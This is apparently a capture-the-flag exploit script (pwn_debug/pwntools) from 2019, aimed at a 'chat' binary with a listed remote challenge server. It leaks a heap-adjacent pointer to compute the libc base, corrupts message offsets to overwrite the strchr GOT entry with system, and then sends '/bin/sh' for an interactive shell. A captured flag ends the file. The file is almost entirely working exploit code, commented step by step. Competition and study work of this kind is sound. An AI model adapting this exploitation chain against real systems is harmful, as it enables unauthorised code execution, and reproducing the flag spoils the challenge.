# File: exp.py
# Author: raycp
# Date: 2019-05-20
# Description: exp for chat

from pwn_debug.pwn_debug import *
from pwn_debug.IO_FILE_plus import *
pdbg=pwn_debug("./chat")

#pdbg.context.log_level="debug"
pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local("./libc-2.27.so","/glibc/x64/2.27/lib/ld-2.27.so")
pdbg.debug("2.27")
pdbg.remote("106.52.252.82",20005,"./libc-2.27.so")
p=pdbg.run("local")
#p=pdbg.run("remote")
#p=pdbg.run("debug")
#membp=pdbg.membp
#print type(pdbg.membp)
#print pdbg.hh
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc
#a=IO_FILE_plus()
#print a
#a.show()
#print a._IO_read_base

def enter(room):
    #p.recvuntil("=\n")
    p.recvuntil("=\n")
    p.sendline("enter "+room)
def say(message):
    #p.recvuntil("=\n")
    p.recvuntil("=\n")
    p.sendline("say "+message)
def modify(name):
    p.recvuntil("=\n")
    p.sendline("modify "+name)


def pwn():
    #pdbg.bp([0x40161b])
    target=elf.got['strchr']
    p.recvuntil(" name: ")
    p.sendline(p64(target))
    #p.recvuntil("a"*0x100)
    #heap_base=u64(p.recvuntil("\n")[:-1].ljust(8,'\x00'))-0x260
    #log.info("leak heap base: %s"%(hex(heap_base)))
    
    #pdbg.bp([0x401f30,0x4019e5])
    enter("123")
    ## step 1 overwrite the first message_mmap_offset to point to ld.so memory
    say(p64(0x13020))
    
    #pdbg.bp(0x400920)

    ## step 2 leak libc address
    say(p64(target))
     
    #libc_base=u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00'))-libc.symbols['__GI___libc_malloc']
    libc_base=u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00'))- 0x97070
    
    log.info("leak libc base: %s"%hex(libc_base))
    
    #say(p64(elf.got['free']))
    malloc_hook=libc_base+libc.symbols['__malloc_hook'] 
    #pdbg.bp(0x401fb3)

    ## step 3 build a fake writable address 
    size=0x10000000000000000-0x215ab0
    print hex(size)
    say((p64(size)*4)[:-1])
    #pdbg.bp(0x401fb3)
    raw_input("go>")
    modify('a'*0x60)
    #pdbg.bp([0x401739,0x401fb3]) 
   
    ## step 4 malloc out strchr got
    pdbg.bp([0x401517,0x400920])
    rce=libc_base+0x4f322  
    system_addr=libc_base+libc.symbols['system']
    say(p64(system_addr))
    raw_input("get shell>")
    p.send("/bin/sh\x00")
    p.interactive() #get the shell

if __name__ == '__main__':
   pwn()

#*CTF{LtMh5VbedHlngmKOS2cwWRo4AkDGzCBy}

